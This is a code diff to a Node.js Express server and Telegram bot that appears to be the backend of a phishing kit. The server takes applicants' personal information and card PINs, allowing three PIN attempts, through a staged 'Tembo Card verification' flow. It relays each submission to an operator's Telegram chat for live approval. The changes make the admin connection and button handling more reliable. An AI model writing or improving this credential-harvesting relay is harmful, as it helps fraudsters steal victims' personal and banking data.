@@ -10,11 +10,11 @@ app.use(express.static(path.join(__dirname, 'public')));
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const bot = new TelegramBot(TOKEN, { polling: true });
 
-let adminChatId = null;
+let adminChatId = process.env.ADMIN_CHAT_ID || null;
 let clientData = {};
 let pinAttempts = 3;
 
-// Admin start command to get private link
+// Admin start command to dynamically capture or update chat ID
 bot.onText(/\/start/, (msg) => {
     adminChatId = msg.chat.id;
     bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\``, { parse_mode: 'Markdown' });
@@ -26,7 +26,7 @@ app.post('/api/submit', async (req, res) => {
     clientData = { ...clientData, ...data };
 
     if (!adminChatId) {
-        return res.status(400).json({ success: false, message: 'Admin not connected to bot.' });
+        return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
     }
 
     if (step === 'personal_info') {
@@ -106,7 +106,12 @@ bot.on('callback_query', async (query) => {
     const action = query.data;
     const chatId = query.message.chat.id;
 
-    await bot.answerCallbackQuery(query.id);
+    // INSTANTLY fade/acknowledge button tap to ensure zero UI delay & high sensitivity
+    try {
+        await bot.answerCallbackQuery(query.id);
+    } catch (e) {
+        console.error('Error answering callback query:', e);
+    }
 
     if (action === 'personal_approve') {
         await bot.sendMessage(chatId, '✅ Personal info approved. Moving applicant to Tembo Card verification.');
